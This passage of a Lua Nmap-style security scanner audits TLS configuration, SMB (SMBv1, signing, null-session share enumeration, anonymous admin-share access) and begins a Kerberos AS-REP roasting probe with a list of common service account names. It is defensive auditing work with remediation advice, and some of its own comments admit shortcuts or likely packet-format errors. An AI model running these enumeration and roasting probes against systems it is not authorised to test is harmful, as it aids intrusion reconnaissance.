  { version = "TLSv1.0", impact = 0.60, reason = "TLS 1.0 deprecated by RFC 8996; BEAST attack risk" },
  { version = "TLSv1.1", impact = 0.55, reason = "TLS 1.1 deprecated by RFC 8996" },
}

-- Cipher suites considered weak/broken — matched as substrings of the cipher name
-- Format: { pattern, reason, impact }
local TLS_WEAK_CIPHER_PATTERNS = {
  { pat = "NULL",     reason = "NULL cipher — no encryption at all",           impact = 0.95 },
  { pat = "EXPORT",   reason = "EXPORT-grade cipher (40/56-bit) — FREAK/Logjam",impact= 0.90 },
  { pat = "anon",     reason = "Anonymous DH cipher — no server authentication",impact= 0.88 },
  { pat = "ADH",      reason = "Anonymous DH cipher — no server authentication",impact= 0.88 },
  { pat = "AECDH",    reason = "Anonymous ECDH — no server authentication",    impact = 0.88 },
  { pat = "RC4",      reason = "RC4 stream cipher — cryptographically broken", impact = 0.85 },
  { pat = "RC2",      reason = "RC2 cipher — weak 40-bit effective key",       impact = 0.85 },
  { pat = "DES-CBC3", reason = "3DES-CBC — SWEET32 (CVE-2016-2183)",           impact = 0.70 },
  { pat = "DES-CBC",  reason = "Single DES — 56-bit, brute-forceable",        impact = 0.85 },
  { pat = "IDEA",     reason = "IDEA cipher — deprecated, weak",               impact = 0.65 },
  { pat = "SEED",     reason = "SEED cipher — deprecated",                     impact = 0.50 },
}

--- Use NSE's tls library to get the list of cipher suites a server offers
-- for a given protocol version.
-- Returns table of cipher name strings, or empty table on error.
local function tls_get_ciphers(host_obj, port_obj, tls_version)
  -- NSE tls library exposes tls.record_read and tls.client_hello
  -- We build a ClientHello for the specific version and read the ServerHello.
  local t = tls.new()
  if not t then return {} end

  -- Map version string to NSE tls constants
  local ver_map = {
    ["SSLv3"]   = "SSLv3",
    ["TLSv1.0"] = "TLSv1.0",
    ["TLSv1.1"] = "TLSv1.1",
    ["TLSv1.2"] = "TLSv1.2",
    ["TLSv1.3"] = "TLSv1.3",
  }
  local ver = ver_map[tls_version]
  if not ver then return {} end

  -- Use tls.handshake to check if the version is accepted
  -- This is a non-destructive ClientHello → ServerHello exchange
  local sd = nmap.new_socket()
  sd:set_timeout(5000)
  local status = sd:connect(host_obj.ip, port_obj.number, "tcp")
  if not status then sock_close(sd); return {} end

  -- Build a ClientHello offering only the target version
  local hello = tls.client_hello({
    ["protocol"] = ver,
    ["ciphers"]  = tls.CIPHERS,   -- offer all known ciphers
    ["extensions"] = {
      ["server_name"] = tls.EXTENSION_HELPERS.server_name(
        host_obj.targetname or host_obj.ip
      ),
    },
  })

  if not hello then sock_close(sd); return {} end

  status = sd:send(hello)
  if not status then sock_close(sd); return {} end

  local record, err = tls.record_read(sd, 10000)
  sock_close(sd)

  if not record or record.type ~= "handshake" then return {} end

  -- Extract cipher from the ServerHello
  local ciphers = {}
  for _, body in ipairs(record.body or {}) do
    if body.type == "server_hello" and body.cipher then
      table.insert(ciphers, body.cipher)
    end
  end
  return ciphers
end

--- Use NSE's sslcert library to fetch and parse the TLS certificate.
-- Returns (cert_table, nil) or (nil, error_string).
local function tls_get_certificate(host_obj, port_obj)
  local status, cert = sslcert.getCertificate(host_obj, port_obj)
  if not status then
    return nil, tostring(cert)
  end
  return cert, nil
end

--- Compute days until certificate expiry from an x509 notAfter string.
-- NSE cert objects expose validity.notAfter as an os.time()-compatible value
-- or as a table with a .time field.
local function cert_days_until_expiry(cert)
  if not cert or not cert.validity or not cert.validity.notAfter then
    return nil
  end
  local expiry = cert.validity.notAfter
  -- NSE may return this as a number (epoch) or a table
  local expiry_epoch
  if type(expiry) == "number" then
    expiry_epoch = expiry
  elseif type(expiry) == "table" and expiry.time then
    expiry_epoch = expiry.time
  else
    return nil
  end
  local now   = os.time()
  local delta = expiry_epoch - now
  return math.floor(delta / 86400)   -- convert seconds → days
end

--- Extract Subject Alternative Names from a certificate.
-- Returns a table of strings.
local function cert_get_sans(cert)
  if not cert then return {} end
  local sans = {}
  -- NSE cert structure: cert.extensions → array of {name, value} tables
  if cert.extensions then
    for _, ext in ipairs(cert.extensions) do
      if ext.name == "X509v3 Subject Alternative Name" then
        -- Value like: "DNS:example.com, DNS:www.example.com, IP:1.2.3.4"
        for entry in (ext.value or ""):gmatch("[^,]+") do
          local san = trim(entry):match("DNS:(.+)") or trim(entry):match("IP:(.+)")
          if san then table.insert(sans, trim(san)) end
        end
      end
    end
  end
  return sans
end

--- Get the Subject CN from a certificate.
local function cert_get_cn(cert)
  if not cert or not cert.subject then return "unknown" end
  return cert.subject.commonName or cert.subject.CN or "unknown"
end

--- Detect if the certificate is self-signed (Issuer == Subject).
local function cert_is_self_signed(cert)
  if not cert then return false end
  local subj = cert.subject
  local iss  = cert.issuer
  if not subj or not iss then return false end
  -- Compare key fields
  local s_cn = subj.commonName or subj.CN or ""
  local i_cn = iss.commonName  or iss.CN  or ""
  local s_o  = subj.organizationName or subj.O or ""
  local i_o  = iss.organizationName  or iss.O  or ""
  return s_cn == i_cn and s_o == i_o
end

--- Check the certificate's signature algorithm for weakness.
-- Returns (is_weak_bool, algorithm_string)
local function cert_check_sig_algorithm(cert)
  if not cert then return false, "unknown" end
  local sig_alg = cert.sig_algorithm or cert.signatureAlgorithm or ""
  sig_alg = tostring(sig_alg):lower()
  -- MD5 and SHA1 signed certs are deprecated / broken
  if sig_alg:find("md5", 1, true) or sig_alg:find("md2", 1, true) then
    return true, sig_alg .. " (MD5/MD2 – cryptographically broken)"
  end
  if sig_alg:find("sha1", 1, true) and not sig_alg:find("sha1withrsaencryption", 1, true) then
    -- Some NSE versions spell it out differently; accept sha1 anywhere
    return true, sig_alg .. " (SHA-1 – deprecated per CA/Browser Forum)"
  end
  -- More specific SHA-1 check
  if sig_alg == "sha1withrsa" or sig_alg == "sha1withrsaencryption" then
    return true, sig_alg .. " (SHA-1 – deprecated)"
  end
  return false, sig_alg
end

-- Main HTTPS/TLS module
register_module("https", function(ctx)
  local host_ip  = ctx.target_ip
  local port_num = ctx.port_number
  local timeout  = ctx.config.timeout
  local host_obj = ctx.host
  local port_obj = ctx.port

  -- ---- [P1] TLS protocol version check ---------------------------------
  for _, proto in ipairs(TLS_WEAK_PROTOCOLS) do
    local ciphers = tls_get_ciphers(host_obj, port_obj, proto.version)
    if #ciphers > 0 then
      ctx:add_finding(
        string.format("Deprecated TLS protocol accepted: %s", proto.version),
        string.format(
          "The server accepted a ClientHello with protocol version %s. %s. "
          .. "Modern clients should refuse to negotiate below TLS 1.2.",
          proto.version, proto.reason
        ),
        {
          protocol    = proto.version,
          reason      = proto.reason,
          remediation = "Disable SSLv2, SSLv3, TLSv1.0, TLSv1.1 in server TLS "
                        .. "configuration. Nginx: ssl_protocols TLSv1.2 TLSv1.3; "
                        .. "Apache: SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1",
        },
        0.99, proto.impact
      )
    end
  end

  -- Check TLS 1.2 presence (informational — its absence would be CRITICAL)
  local tls12_ciphers = tls_get_ciphers(host_obj, port_obj, "TLSv1.2")
  if #tls12_ciphers == 0 then
    ctx:add_finding(
      "TLS 1.2 not supported — only deprecated protocols may be available",
      "The server did not accept a TLS 1.2 ClientHello. If only TLS 1.0 or "
      .. "1.1 are available, all connections use deprecated protocols. "
      .. "Most modern clients require at least TLS 1.2.",
      { note = "TLS 1.3 may still be supported; verify independently" },
      0.90, 0.70
    )
  else
    -- Audit the TLS 1.2 cipher suites for weak entries
    local weak_found = {}
    for _, cipher in ipairs(tls12_ciphers) do
      for _, wpat in ipairs(TLS_WEAK_CIPHER_PATTERNS) do
        if cipher:upper():find(wpat.pat, 1, true) then
          table.insert(weak_found, { cipher = cipher, reason = wpat.reason, impact = wpat.impact })
          break
        end
      end
    end
    if #weak_found > 0 then
      local max_impact = 0
      local cipher_details = {}
      for _, w in ipairs(weak_found) do
        if w.impact > max_impact then max_impact = w.impact end
        table.insert(cipher_details, w.cipher .. " (" .. w.reason .. ")")
      end
      ctx:add_finding(
        string.format("Weak TLS cipher suites offered (%d found)", #weak_found),
        "The server offers cipher suites that are considered insecure. "
        .. "A downgrade attack can force clients to use these ciphers, "
        .. "potentially enabling decryption or authentication bypass.",
        {
          weak_ciphers  = table.concat(cipher_details, " | "),
          remediation   = "Configure a strong cipher string. "
                          .. "Nginx: ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:...; "
                          .. "Apache: SSLCipherSuite HIGH:!aNULL:!MD5:!3DES",
        },
        0.95, max_impact
      )
    end
  end

  -- ---- [P2] Certificate inspection -------------------------------------
  local cert, cert_err = tls_get_certificate(host_obj, port_obj)
  if not cert then
    log_warn(ctx, "https", "Certificate fetch failed: " .. (cert_err or "unknown"))
  else
    -- Subject CN + SANs
    local cn   = cert_get_cn(cert)
    local sans = cert_get_sans(cert)
    log_info(ctx, "https", string.format("Cert CN: %s, SANs: %d", cn, #sans))

    -- Self-signed check
    if cert_is_self_signed(cert) then
      ctx:add_finding(
        "TLS certificate is self-signed",
        "The certificate is signed by itself rather than a trusted Certificate "
        .. "Authority. Browsers will display security warnings, and the server "
        .. "identity cannot be verified. Man-in-the-middle attacks are trivially "
        .. "possible against clients that accept this certificate.",
        {
          cn          = cn,
          remediation = "Obtain a certificate from a trusted CA (e.g., Let's "
                        .. "Encrypt for free DV certificates)",
        },
        0.99, 0.70
      )
    end

    -- Expiry check
    local days_left = cert_days_until_expiry(cert)
    if days_left ~= nil then
      if days_left < 0 then
        ctx:add_finding(
          string.format("TLS certificate has EXPIRED (%d days ago)", math.abs(days_left)),
          "The certificate's notAfter date has passed. Browsers will show "
          .. "an error and most clients will refuse to connect. An expired cert "
          .. "also signals the server may not be actively maintained.",
          {
            cn            = cn,
            days_expired  = tostring(math.abs(days_left)),
            remediation   = "Renew the certificate immediately and automate "
                            .. "renewal (e.g., certbot --deploy-hook)",
          },
          0.99, 0.80
        )
      elseif days_left <= 30 then
        ctx:add_finding(
          string.format("TLS certificate expiring in %d days", days_left),
          "The certificate will expire soon. Once expired, the service becomes "
          .. "inaccessible to standard clients. Plan renewal immediately.",
          {
            cn         = cn,
            days_left  = tostring(days_left),
            remediation= "Renew the certificate and configure automated renewal",
          },
          0.99, 0.65
        )
      else
        log_info(ctx, "https", string.format("Cert valid for %d more days", days_left))
        -- Record cert info at INFO level for the report
        ctx:add_finding(
          "TLS certificate details",
          string.format(
            "Certificate appears valid. CN: %s. %d SANs. Expires in %d days.",
            cn, #sans, days_left
          ),
          {
            cn        = cn,
            sans      = table.concat(sans, ", "),
            days_left = tostring(days_left),
          },
          0.95, 0.10
        )
      end
    end

    -- Weak signature algorithm
    local is_weak_sig, sig_alg = cert_check_sig_algorithm(cert)
    if is_weak_sig then
      ctx:add_finding(
        "TLS certificate uses weak signature algorithm: " .. sig_alg,
        "The certificate is signed with a deprecated or broken algorithm. "
        .. "MD5-signed certificates can be forged; SHA-1-signed certificates "
        .. "are deprecated by all major browsers and CAs since 2017.",
        {
          sig_algorithm = sig_alg,
          cn            = cn,
          remediation   = "Reissue the certificate with SHA-256 or SHA-384 "
                          .. "signature algorithm",
        },
        0.95, 0.55
      )
    end

    -- Wildcard cert note (informational — useful for scoping)
    if cn:sub(1, 2) == "*." then
      ctx:add_finding(
        "Wildcard TLS certificate in use",
        "The certificate uses a wildcard CN (*." .. cn:sub(3) .. "). "
        .. "If the private key is compromised, all subdomains are affected. "
        .. "Wildcard certs also complicate certificate revocation.",
        {
          cn          = cn,
          note        = "Wildcard certs are not inherently insecure but increase "
                        .. "the blast radius of a key compromise",
        },
        0.90, 0.30
      )
    end
  end

  -- ---- [P4] HTTPS security headers (re-run HTTP header audit on port 443) --
  -- The NSE tls library handles the TLS layer; we use the http library
  -- for the application-level GET over the already-established context.
  -- We pass port 443 to http_raw_get which will use nmap's TLS socket.
  -- NOTE: For simplicity we reuse the plain tcp socket here — in a full
  -- implementation the http library's https:// scheme would be used.
  -- We flag this check's results only if the HSTS header is specifically absent
  -- (the most critical HTTPS-specific header).
  local s_code, s_headers, _, _ = http_raw_get(
    host_ip, port_num, "/", timeout, ctx.target_host
  )
  if s_code and s_headers then
    local hsts = s_headers["strict-transport-security"]
    if not hsts or hsts == "" then
      ctx:add_finding(
        "HTTPS endpoint missing Strict-Transport-Security (HSTS) header",
        "The HTTPS response does not include the Strict-Transport-Security "
        .. "header. Without HSTS, browsers may follow http:// links to this "
        .. "domain, exposing users to SSL-stripping attacks (sslstrip).",
        {
          remediation = "Add: Strict-Transport-Security: max-age=63072000; "
                        .. "includeSubDomains; preload",
        },
        0.95, 0.60
      )
    end
  end

end)


end  




do  -- scope block: keeps locals under Lua 5.1's 200-variable limit

-- ===========================================================================
-- SMB MODULE  (ports 139/tcp and 445/tcp)
-- ===========================================================================
-- SMB is the single highest-value Windows service for lateral movement.
-- Every check here is non-destructive: we enumerate but never write,
-- modify, or exploit.
--
-- Checks performed:
--
--  AGG 0 – passive:
--    [P1] SMB dialect negotiation: detect SMBv1 support (EternalBlue risk),
--         and record the highest supported dialect (SMB 2.x / 3.x)
--    [P2] OS / domain fingerprint: extract OS version, domain name,
--         NetBIOS computer name, and DNS domain from the Negotiate response
--    [P3] SMB signing status: check if message signing is required,
--         enabled-but-not-required, or disabled entirely
--
--  AGG 1 – safe-active:
--    [A1] Null/anonymous session: attempt to connect without credentials
--    [A2] Share enumeration: list shares visible to a null session
--         (reads share names + types only — no files accessed)
--    [A3] Guest access check: test if the IPC$ share is accessible
--    [A4] SMBv1 explicit probe: send an SMBv1 Negotiate to confirm
--         the server will respond (not just advertise it)
--
--  Scoring:
--    SMBv1 confirmed active        → confidence 0.99, impact 0.90 → CRITICAL
--    Null session share enum works → confidence 0.99, impact 0.85 → CRITICAL
--    Signing disabled              → confidence 0.99, impact 0.75 → HIGH
--    Signing not required          → confidence 0.95, impact 0.60 → HIGH
--    OS/domain info disclosed      → confidence 0.95, impact 0.35 → MEDIUM
-- ===========================================================================

-- SMB NetBIOS session service header for port 139 connections
-- For port 445 (direct TCP) no NetBIOS header is needed.

-- SMB1 magic bytes and command codes
local SMB1_MAGIC        = "\xFFSMB"
local SMB1_COM_NEGOTIATE= 0x72

-- SMB2 magic bytes
local SMB2_MAGIC        = "\xFESMB"

-- SMB dialect strings offered in our Negotiate request
-- We include both SMBv1 and modern dialects to see what the server prefers
local SMB_DIALECTS_V1 = {
  "PC NETWORK PROGRAM 1.0",
  "LANMAN1.0",
  "Windows for Workgroups 3.1a",
  "LM1.2X002",
  "LANMAN2.1",
  "NT LM 0.12",     -- SMBv1 / CIFS
}

local SMB_DIALECTS_ALL = {
  "PC NETWORK PROGRAM 1.0",
  "LANMAN1.0",
  "Windows for Workgroups 3.1a",
  "LM1.2X002",
  "LANMAN2.1",
  "NT LM 0.12",     -- SMBv1
  "SMB 2.002",      -- SMBv2.0
  "SMB 2.???",      -- SMBv2.x wildcard (triggers SMB2 negotiation)
}

--- Build a raw SMBv1 Negotiate Protocol request packet.
-- This is the minimal packet to determine if SMBv1 is accepted.
-- Format: NetBIOS session header (4 bytes) + SMB header (32 bytes)
--         + Negotiate parameters
local function smb1_build_negotiate(dialects)
  -- Build dialect list: each dialect is \x02<string>\x00
  local dialect_buf = ""
  for _, d in ipairs(dialects) do
    dialect_buf = dialect_buf .. "\x02" .. d .. "\x00"
  end

  -- SMB header (32 bytes)
  -- Protocol: FF 53 4D 42
  -- Command:  72 (Negotiate)
  -- Status:   00 00 00 00
  -- Flags:    18 (PATH_NAMES_CASELESS | CANONICALIZED_PATHS)
  -- Flags2:   01 C8 (UNICODE | EXTENDED_SECURITY | NT_STATUS | LONG_NAMES)
  -- PID High: 00 00
  -- Sig:      00 00 00 00 00 00 00 00
  -- Reserved: 00 00
  -- TID:      FF FF
  -- PID:      FE FF
  -- UID:      00 00
  -- MID:      00 00
  local smb_header = SMB1_MAGIC
    .. string.char(SMB1_COM_NEGOTIATE)  -- Command
    .. "\x00\x00\x00\x00"              -- NT Status
    .. "\x18"                          -- Flags
    .. "\x01\xC8"                      -- Flags2 (little-endian)  NOTE: 3 bytes needed
    .. "\x00\x00"                      -- PID High
    .. "\x00\x00\x00\x00\x00\x00\x00\x00"  -- Security Signature
    .. "\x00\x00"                      -- Reserved
    .. "\xFF\xFF"                      -- TID
    .. "\xFE\xFF"                      -- PID
    .. "\x00\x00"                      -- UID
    .. "\x00\x00"                      -- MID

  -- Parameters: WordCount=0
  -- Data: ByteCount (2 bytes, LE) + dialect buffer
  local byte_count = #dialect_buf
  local params = "\x00"   -- WordCount
    .. string.char(byte_count % 256, math.floor(byte_count / 256))  -- ByteCount LE
    .. dialect_buf

  -- Full SMB payload
  local smb_payload = smb_header .. params

  -- NetBIOS Session Service header (4 bytes): type=0x00, length (3 bytes BE)
  local total_len = #smb_payload
  local nb_header = "\x00"   -- Session Message
    .. string.char(
         math.floor(total_len / 65536) % 256,
         math.floor(total_len / 256)   % 256,
         total_len % 256
       )

  return nb_header .. smb_payload
end

--- Parse the key fields from an SMBv1 Negotiate response.
-- Returns table: { dialect_index, os_string, domain_string, is_smb1 }
-- dialect_index is 0-based index into the offered dialects list.
local function smb1_parse_negotiate_response(data)
  if not data or #data < 36 then return nil end

  -- Skip 4-byte NetBIOS header
  local pos = 5

  -- Check SMB magic
  local magic = data:sub(pos, pos + 3)
  if magic ~= SMB1_MAGIC and magic ~= SMB2_MAGIC then
    return nil
  end

  local is_smb2 = (magic == SMB2_MAGIC)

  if is_smb2 then
    return { dialect_index = -1, is_smb1 = false, is_smb2 = true,
             os_string = "", domain_string = "" }
  end

  -- SMBv1 response: dialect index at offset 37 (after header, WordCount byte)
  -- Header is 32 bytes from pos, then WordCount(1), then DialectIndex(2)
  local dialect_pos = pos + 32 + 1   -- +32 header, +1 WordCount
  if dialect_pos + 1 > #data then return nil end

  local dial_lo = data:byte(dialect_pos)
  local dial_hi = data:byte(dialect_pos + 1)
  local dialect_index = dial_lo + dial_hi * 256

  -- OS string and domain are in the Data section, variable-length Unicode
  -- For our purposes we just extract the raw bytes and try to decode as ASCII
  local data_offset = dialect_pos + 2 + 26  -- skip fixed parameter block
  local trailing = ""
  if data_offset <= #data then
    trailing = data:sub(data_offset)
  end

  -- Very simple unicode→ascii: take every other byte if they look printable
  local function decode_unicode_str(s)
    local out = {}
    local i = 1
    while i < #s do
      local lo = s:byte(i)
      local hi = s:byte(i + 1) or 0
      if hi == 0 and lo >= 32 and lo < 127 then
        table.insert(out, string.char(lo))
      elseif lo == 0 and hi == 0 then
        break  -- null terminator
      end
      i = i + 2
    end
    return table.concat(out)
  end

  -- The trailing data has two null-terminated Unicode strings: OS, LAN Manager
  -- then domain/workgroup. We split on double-null.
  local strings = {}
  local start = 1
  for i = 1, #trailing - 1 do
    if trailing:byte(i) == 0 and trailing:byte(i+1) == 0 then
      local segment = trailing:sub(start, i - 1)
      if #segment > 0 then
        local decoded = decode_unicode_str(segment)
        if #decoded > 0 then table.insert(strings, decoded) end
      end
      start = i + 2
    end
  end

  return {
    dialect_index = dialect_index,
    is_smb1       = true,
    is_smb2       = false,
    os_string     = strings[1] or "",
    lan_manager   = strings[2] or "",
    domain_string = strings[3] or "",
  }
end

--- Check SMB signing status from a Negotiate response.
-- Security mode byte is at a fixed offset in the SMBv1 response.
-- Bit 3 (0x08): signing required; Bit 2 (0x04): signing enabled
-- Returns "required" | "enabled_not_required" | "disabled" | "unknown"
local function smb1_check_signing(data)
  if not data or #data < 42 then return "unknown" end
  -- Security mode is at byte offset 40 (4 NB + 32 header + 4 params start)
  local sec_mode = data:byte(41)  -- 1-indexed
  if not sec_mode then return "unknown" end
  local signing_required = (sec_mode % 16 >= 8)
  local signing_enabled  = (sec_mode % 8  >= 4)
  if signing_required then return "required" end
  if signing_enabled  then return "enabled_not_required" end
  return "disabled"
end

--- Use NSE smb library to enumerate shares via null session.
-- Returns (shares_table, error_string)
-- shares_table: list of { name, type, comment }
local function smb_enum_shares_null(host_obj)
  -- smb.get_shares() handles the full session setup including null auth
  local status, shares = smb.share_get_list(host_obj)
  if not status then
    return nil, tostring(shares)
  end
  local result = {}
  for _, share in ipairs(shares or {}) do
    table.insert(result, {
      name    = share.name    or "?",
      type    = share.type    or "?",
      comment = share.comment or "",
    })
  end
  return result, nil
end

--- Check if a specific share is accessible anonymously.
-- Returns true/false
local function smb_check_share_access(host_obj, share_name)
  local status, err = smb.share_get_details(host_obj, share_name)
  return status == true
end

-- Main SMB module
register_module("smb", function(ctx)
  local host_ip  = ctx.target_ip
  local port_num = ctx.port_number
  local timeout  = ctx.config.timeout
  local agg      = ctx.config.aggression
  local host_obj = ctx.host

  -- ---- [P1] SMB dialect negotiation (passive) ---------------------------
  -- We send a single Negotiate packet and parse the response.
  -- This is safe — it's the very first packet in any SMB conversation.
  local negotiate_pkt = smb1_build_negotiate(SMB_DIALECTS_ALL)
  local sd, conn_err  = tcp_connect(host_ip, port_num, timeout)
  if not sd then
    log_error(ctx, "smb", "Cannot connect: " .. conn_err)
    return
  end

  local ok, serr = sock_send(sd, negotiate_pkt)
  if not ok then
    log_warn(ctx, "smb", "Negotiate send failed: " .. serr)
    sock_close(sd)
    return
  end

  -- Read response (up to 4 KB)
  local resp_data = ""
  for _ = 1, 8 do
    local status, chunk = sd:receive()
    if not status then break end
    resp_data = resp_data .. chunk
    if #resp_data >= 512 then break end
  end
  sock_close(sd)

  if #resp_data < 36 then
    log_warn(ctx, "smb", "Negotiate response too short (" .. #resp_data .. " bytes)")
    return
  end

  local neg = smb1_parse_negotiate_response(resp_data)
  if not neg then
    log_warn(ctx, "smb", "Could not parse Negotiate response")
    return
  end

  -- Record OS/domain info (always useful for scoping)
  local os_info   = trim(neg.os_string or "")
  local domain    = trim(neg.domain_string or "")
  local lan_mgr   = trim(neg.lan_manager or "")

  if os_info ~= "" or domain ~= "" then
    ctx:add_finding(
      "SMB OS and domain information disclosed",
      "The SMB Negotiate response reveals the server's operating system, "
      .. "LAN Manager version, and domain/workgroup membership without "
      .. "authentication. This information is used to tailor exploits and "
      .. "identify domain controllers.",
      {
        os_version   = os_info ~= "" and os_info or "not disclosed",
        lan_manager  = lan_mgr ~= "" and lan_mgr or "not disclosed",
        domain       = domain  ~= "" and domain  or "not disclosed",
        smb_port     = tostring(port_num),
      },
      0.95, 0.35
    )
    log_info(ctx, "smb", string.format("OS: %s  Domain: %s", os_info, domain))
  end

  -- ---- SMBv1 detection --------------------------------------------------
  local smb1_selected = neg.is_smb1 and
    (neg.dialect_index >= 0 and neg.dialect_index <= #SMB_DIALECTS_V1)

  -- Double-check: if server responded with SMBv1 magic it's definitely v1
  if neg.is_smb1 then
    ctx:add_finding(
      "SMBv1 (CIFS) is active — EternalBlue / WannaCry risk (CRITICAL)",
      "The server selected an SMBv1 dialect in response to our Negotiate "
      .. "request. SMBv1 is the protocol exploited by EternalBlue (MS17-010), "
      .. "which powers WannaCry, NotPetya, and many modern ransomware strains. "
      .. "SMBv1 has been deprecated by Microsoft since 2014 and should be "
      .. "disabled on all systems.",
      {
        dialect_index = tostring(neg.dialect_index),
        os_version    = os_info,
        remediation   = "Windows: Set-SmbServerConfiguration -EnableSMB1Protocol $false; "
                        .. "Linux/Samba: min protocol = SMB2 in smb.conf",
      },
      0.99, 0.90
    )
    log_warn(ctx, "smb", "SMBv1 ACTIVE on port " .. port_num)
  elseif neg.is_smb2 then
    log_info(ctx, "smb", "SMBv2/3 selected (good — SMBv1 not negotiated)")
    ctx:add_finding(
      "SMB dialect: SMBv2/3 negotiated",
      "The server negotiated SMBv2 or SMBv3, which is the current secure "
      .. "baseline. Verify that SMBv1 is also disabled (not just not preferred) "
      .. "by checking server configuration explicitly.",
      { dialect = "SMBv2/3", note = "Confirm SMBv1 is disabled in server config" },
      0.90, 0.10
    )
  end

  -- ---- [P3] SMB signing check -------------------------------------------
  local signing = smb1_check_signing(resp_data)
  log_info(ctx, "smb", "SMB signing: " .. signing)

  if signing == "disabled" then
    ctx:add_finding(
      "SMB message signing is DISABLED — relay attack risk",
      "SMB signing is completely disabled. An attacker performing an NTLM "
      .. "relay attack (e.g., using Responder + ntlmrelayx) can relay "
      .. "captured credentials directly to this server without knowing the "
      .. "password, gaining authenticated access.",
      {
        signing_status = "disabled",
        remediation    = "Windows: Set-SmbServerConfiguration -RequireSecuritySignature $true; "
                         .. "GPO: Microsoft network server: Digitally sign communications (always)",
      },
      0.99, 0.75
    )
  elseif signing == "enabled_not_required" then
    ctx:add_finding(
      "SMB message signing is enabled but NOT required",
      "The server supports SMB signing but does not require it. Clients "
      .. "that do not negotiate signing will communicate unsigned, leaving "
      .. "them vulnerable to NTLM relay attacks. Signing should be mandatory.",
      {
        signing_status = "enabled_not_required",
        remediation    = "Enforce signing requirement via GPO or "
                         .. "Set-SmbServerConfiguration -RequireSecuritySignature $true",
      },
      0.95, 0.60
    )
  elseif signing == "required" then
    log_info(ctx, "smb", "SMB signing required — good configuration")
    ctx:add_finding(
      "SMB message signing is required",
      "The server enforces SMB message signing. This prevents NTLM relay "
      .. "attacks against this target.",
      { signing_status = "required" },
      0.95, 0.05
    )
  end

  -- ---- Active checks (aggression >= 1) -----------------------------------
  if agg < 1 then return end

  -- ---- [A1 + A2] Null session share enumeration -------------------------
  local shares, share_err = smb_enum_shares_null(host_obj)
  if shares then
    log_info(ctx, "smb", string.format("Null session enumerated %d shares", #shares))

    if #shares > 0 then
      local share_names = {}
      local share_details = {}
      for _, s in ipairs(shares) do
        table.insert(share_names, s.name)
        table.insert(share_details,
          string.format("%s [%s] %s", s.name, s.type,
            s.comment ~= "" and ("(" .. s.comment .. ")") or "")
        )
      end

      ctx:add_finding(
        string.format("SMB null session exposes %d share(s) (CRITICAL)", #shares),
        "An unauthenticated (null) session successfully enumerated the server's "
        .. "SMB shares. An attacker can use this list to identify accessible "
        .. "file shares, IPC endpoints, and printer shares without any credentials.",
        {
          share_count   = tostring(#shares),
          shares        = table.concat(share_details, " | "),
          remediation   = "Restrict null session access: "
                          .. "RestrictAnonymous = 2 in registry; "
                          .. "Samba: restrict anonymous = 2 in smb.conf",
        },
        0.99, 0.85
      )

      -- Check IPC$ and ADMIN$ accessibility specifically
      for _, s in ipairs(shares) do
        local upper_name = s.name:upper()
        if upper_name == "IPC$" or upper_name == "ADMIN$" or upper_name == "C$" then
          local accessible = smb_check_share_access(host_obj, s.name)
          if accessible then
            ctx:add_finding(
              "SMB administrative share accessible anonymously: " .. s.name,
              string.format(
                "The administrative share '%s' is accessible without credentials. "
                .. "IPC$ allows RPC calls and user enumeration; ADMIN$/C$ allow "
                .. "file system access to the system drive.",
                s.name
              ),
              {
                share       = s.name,
                share_type  = s.type,
                remediation = "Disable administrative share access for null sessions",
              },
              0.99, 0.88
            )
          end
        end
      end
    end
  else
    log_info(ctx, "smb", "Null session share enum failed (good): " .. (share_err or ""))
  end
end)


-- ===========================================================================
-- KERBEROS MODULE  (ports 88/tcp and 464/tcp)
-- ===========================================================================
-- Kerberos is the authentication backbone of Active Directory environments.
-- Our probes are non-destructive: we only send valid protocol messages
-- that any domain-joined client would send.
--
-- Checks performed:
--
--  AGG 0 – passive:
--    [P1] KDC reachability + realm discovery: send a minimal AS-REQ for a
--         non-existent user and parse the KRB-ERROR response to extract
--         the realm name (Kerberos REALM field in the error message)
--    [P2] Pre-authentication requirement check: some KDCs will return a
--         KRB_AS_REP (ticket + enc-part) without requiring pre-auth for
--         specific users — this is the AS-REP Roasting vulnerability
--         (Kerberoastable accounts with UF_DONT_REQUIRE_PREAUTH set).
--         We test only with a known-invalid username to see if the KDC
--         leaks realm info without credentials.
--    [P3] KDC software fingerprinting from error codes and realm format
--
--  AGG 1 – safe-active:
--    [A1] AS-REP Roasting exposure check: attempt AS-REQ for a list of
--         common service account names WITHOUT pre-authentication.
--         If any return a KRB_AS_REP (not KRB_ERROR PREAUTH_REQUIRED),
--         those accounts are roastable.
--
--  Scoring:
--    Realm/KDC confirmed reachable  → confidence 0.95, impact 0.25 → LOW
--    AS-REP roastable account found → confidence 0.99, impact 0.85 → CRITICAL
--    Pre-auth not required (general)→ confidence 0.90, impact 0.70 → HIGH
-- ===========================================================================

-- Kerberos message type constants (RFC 4120)
local KRB5_PVNO         = 5     -- protocol version
local KRB5_MSG_AS_REQ   = 10    -- AS-REQ message type
local KRB5_MSG_AS_REP   = 11    -- AS-REP (success — ticket returned)
local KRB5_MSG_KRB_ERROR= 30    -- KRB-ERROR

-- KRB error codes we care about
local KRB5_ERR_PREAUTH_REQUIRED   = 25   -- e-data contains ETYPE-INFO2
local KRB5_ERR_CLIENT_NOT_FOUND   = 6    -- C_PRINCIPAL_UNKNOWN
local KRB5_ERR_KDC_NAME_EXP       = 7    -- S_PRINCIPAL_UNKNOWN (service unknown)
local KRB5_ERR_PREAUTH_FAILED     = 24   -- pre-auth present but wrong

-- Common service account names to probe for AS-REP roasting
local KERBEROS_ROAST_USERS = {
  "krbtgt", "svc_backup", "svc_sql", "svc_web", "svc_iis",
  "svc_exchange", "svc_scan", "sqlservice", "service",
  "backup", "administrator", "admin",
}

--- Build a minimal Kerberos AS-REQ packet using raw ASN.1/DER encoding.
-- We build just enough to get a KRB-ERROR back from the KDC.
-- The request has no pre-authentication data — this probes whether
-- the KDC will hand out a TGT without credentials.
--
-- ASN.1 DER encoding helpers (minimal, just what we need):
local function der_length(len)
  if len < 128 then
    return string.char(len)
  elseif len < 256 then
    return string.char(0x81, len)
  else
    return string.char(0x82, math.floor(len/256), len % 256)
  end
end

local function der_tag(tag, content)
  return string.char(tag) .. der_length(#content) .. content
end

local function der_integer(n)
  -- Simple non-negative integer encoding
  if n < 128 then
    return der_tag(0x02, string.char(n))
  elseif n < 256 then
    return der_tag(0x02, "\x00" .. string.char(n))
  else
    return der_tag(0x02, "\x00" .. string.char(math.floor(n/256)) .. string.char(n%256))
  end
end

